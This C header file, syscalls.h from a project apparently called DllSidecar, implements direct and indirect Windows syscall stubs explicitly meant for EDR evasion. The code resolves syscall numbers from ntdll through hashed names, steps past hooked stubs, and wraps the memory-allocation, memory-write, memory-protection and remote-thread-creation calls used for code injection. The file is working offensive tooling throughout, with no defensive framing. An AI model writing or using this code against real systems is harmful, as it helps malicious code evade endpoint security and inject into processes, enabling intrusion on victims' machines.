/*
 * DllSidecar — syscalls.h
 * Direct/indirect syscall stubs for EDR evasion.
 * Resolves SSNs at runtime from ntdll's export table.
 *
 * x64: direct syscall instruction
 * x86: indirect via ntdll syscall stub
 *
 * @tunelko — BugAInters 2026
 */

#ifndef SYSCALLS_H
#define SYSCALLS_H

#include "dinvoke.h"

/* ── NTSTATUS and NT types ── */

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;

/* ── SSN extraction from ntdll stubs ── */

/*
 * x64 ntdll Nt* stub pattern:
 *   4C 8B D1          mov r10, rcx
 *   B8 XX XX 00 00    mov eax, SSN
 *   ...
 *   0F 05             syscall
 *
 * x86 ntdll Nt* stub pattern:
 *   B8 XX XX 00 00    mov eax, SSN
 *   ...
 */

static DWORD sc_get_ssn(PVOID ntdll_base, unsigned long func_hash) {
    FARPROC func = dinvoke_get_proc(ntdll_base, func_hash);
    if (!func) return (DWORD)-1;

#ifdef _WIN64
    /* x64: 4C 8B D1 B8 XX XX 00 00 */
    BYTE *p = (BYTE *)func;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(DWORD *)(p + 4);
    }
    /* Hooked stub — search nearby for syscall pattern */
    /* Walk up to 32 bytes looking for mov eax, imm32 */
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0xB8 && p[i+3] == 0x00 && p[i+4] == 0x00) {
            return *(DWORD *)(p + i + 1);
        }
    }
#else
    /* x86: B8 XX XX 00 00 */
    BYTE *p = (BYTE *)func;
    if (p[0] == 0xB8) {
        return *(DWORD *)(p + 1);
    }
#endif
    return (DWORD)-1;
}

/* ── Pre-computed NT API hashes (djb2) ── */

#define H_NTCREATETHREADEX       0xCB0C2130UL  /* NtCreateThreadEx       */
#define H_NTALLOCATEVIRTUALMEM   0x6793C34CUL  /* NtAllocateVirtualMemory */
#define H_NTWRITEVIRTUALMEM      0x95F3A792UL  /* NtWriteVirtualMemory   */
#define H_NTPROTECTVIRTUALMEM    0x082962C8UL  /* NtProtectVirtualMemory */
#define H_NTCLOSE                0x8B8E133DUL  /* NtClose                */
#define H_NTCREATEFILE           0x15A5ECDBUL  /* NtCreateFile           */

/* ── Syscall state: resolved SSNs ── */

typedef struct _SC_SYSCALLS {
    DWORD NtCreateThreadEx;
    DWORD NtAllocateVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtClose;
    PVOID ntdll_base;
    BOOL  initialized;
} SC_SYSCALLS;

static SC_SYSCALLS g_sc = {0};

static BOOL sc_init(void) {
    if (g_sc.initialized) return TRUE;

    g_sc.ntdll_base = dinvoke_get_module(H_NTDLL_DLL);
    if (!g_sc.ntdll_base) return FALSE;

    g_sc.NtCreateThreadEx       = sc_get_ssn(g_sc.ntdll_base, H_NTCREATETHREADEX);
    g_sc.NtAllocateVirtualMemory = sc_get_ssn(g_sc.ntdll_base, H_NTALLOCATEVIRTUALMEM);
    g_sc.NtWriteVirtualMemory   = sc_get_ssn(g_sc.ntdll_base, H_NTWRITEVIRTUALMEM);
    g_sc.NtProtectVirtualMemory = sc_get_ssn(g_sc.ntdll_base, H_NTPROTECTVIRTUALMEM);
    g_sc.NtClose                = sc_get_ssn(g_sc.ntdll_base, H_NTCLOSE);

    g_sc.initialized = TRUE;
    return TRUE;
}

#ifdef _WIN64

/* ═══════════════════════════════════════════════════════
 *  x64 direct syscall stubs
 *  Convention: rcx=arg1, rdx=arg2, r8=arg3, r9=arg4,
 *              stack for arg5+. r10=rcx before syscall.
 * ═══════════════════════════════════════════════════════ */

/*
 * do_syscall(DWORD ssn, arg1, arg2, arg3, arg4, ...)
 * Generic dispatcher — shifts args so SSN goes to eax.
 */
__attribute__((naked)) static NTSTATUS do_syscall(DWORD ssn, ...) {
    __asm__ (
        "mov %ecx, %eax\n"         /* eax = SSN (first arg on x64 = ecx) */
        "mov %rdx, %rcx\n"         /* shift: arg1 = rdx -> rcx */
        "mov %r8, %rdx\n"          /* shift: arg2 = r8  -> rdx */
        "mov %r9, %r8\n"           /* shift: arg3 = r9  -> r8  */
        "mov 0x28(%rsp), %r9\n"    /* shift: arg4 from stack -> r9 */
        "mov %rcx, %r10\n"         /* syscall convention: r10 = first arg */
        "sub $0x08, %rsp\n"        /* align stack (shifted 1 arg out) */
        /* Copy remaining stack args */
        "mov 0x38(%rsp), %r11\n"
        "mov %r11, 0x28(%rsp)\n"
        "mov 0x40(%rsp), %r11\n"
        "mov %r11, 0x30(%rsp)\n"
        "mov 0x48(%rsp), %r11\n"
        "mov %r11, 0x38(%rsp)\n"
        "mov 0x50(%rsp), %r11\n"
        "mov %r11, 0x40(%rsp)\n"
        "mov 0x58(%rsp), %r11\n"
        "mov %r11, 0x48(%rsp)\n"
        "mov 0x60(%rsp), %r11\n"
        "mov %r11, 0x50(%rsp)\n"
        "mov 0x68(%rsp), %r11\n"
        "mov %r11, 0x58(%rsp)\n"
        "syscall\n"
        "add $0x08, %rsp\n"
        "ret\n"
    );
}

/* ── Typed wrappers ── */

static NTSTATUS sc_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    return do_syscall(g_sc.NtAllocateVirtualMemory,
        ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

static NTSTATUS sc_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
{
    return do_syscall(g_sc.NtWriteVirtualMemory,
        ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

static NTSTATUS sc_NtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
{
    return do_syscall(g_sc.NtProtectVirtualMemory,
        ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

static NTSTATUS sc_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList)
{
    return do_syscall(g_sc.NtCreateThreadEx,
        ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
        StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
        MaximumStackSize, AttributeList);
}

#else /* _WIN32 (x86) */

/* ═══════════════════════════════════════════════════════
 *  x86: indirect syscall via ntdll stub address
 *  We jump into ntdll's actual syscall instruction to
 *  avoid having a bare syscall/int 2e in our code.
 * ═══════════════════════════════════════════════════════ */

static PVOID sc_find_syscall_addr(PVOID ntdll_base, unsigned long func_hash) {
    /* Find the actual syscall/sysenter/int 2e instruction in ntdll stub */
    FARPROC func = dinvoke_get_proc(ntdll_base, func_hash);
    if (!func) return NULL;
    BYTE *p = (BYTE *)func;
    for (int i = 0; i < 32; i++) {
        /* sysenter (0F 34) or int 2e (CD 2E) or syscall (0F 05) */
        if ((p[i] == 0x0F && p[i+1] == 0x34) ||
            (p[i] == 0xCD && p[i+1] == 0x2E) ||
            (p[i] == 0x0F && p[i+1] == 0x05)) {
            return &p[i];
        }
    }
    return NULL;
}

/*
 * x86 indirect syscall: set eax=SSN, edx=stack, jump to ntdll's
 * sysenter/int 2e instruction. Avoids inline syscall in our binary.
 */
__attribute__((naked)) static NTSTATUS do_syscall_x86(
    DWORD ssn, PVOID syscall_addr, ...)
{
    __asm__ (
        "mov 0x04(%esp), %eax\n"   /* eax = SSN */
        "mov 0x08(%esp), %ecx\n"   /* ecx = syscall_addr */
        "lea 0x0C(%esp), %edx\n"   /* edx = pointer to real args */
        "push %edx\n"              /* push args pointer */
        "call *%ecx\n"             /* call ntdll syscall stub */
        "ret\n"
    );
}

/* x86 typed wrappers need the syscall address resolved per-call */

static NTSTATUS sc_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    PVOID addr = sc_find_syscall_addr(g_sc.ntdll_base, H_NTALLOCATEVIRTUALMEM);
    if (!addr) return (NTSTATUS)0xC0000001L;
    return do_syscall_x86(g_sc.NtAllocateVirtualMemory, addr,
        ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

static NTSTATUS sc_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList)
{
    PVOID addr = sc_find_syscall_addr(g_sc.ntdll_base, H_NTCREATETHREADEX);
    if (!addr) return (NTSTATUS)0xC0000001L;
    return do_syscall_x86(g_sc.NtCreateThreadEx, addr,
        ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
        StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
        MaximumStackSize, AttributeList);
}

#endif /* _WIN64 / x86 */

#endif /* SYSCALLS_H */
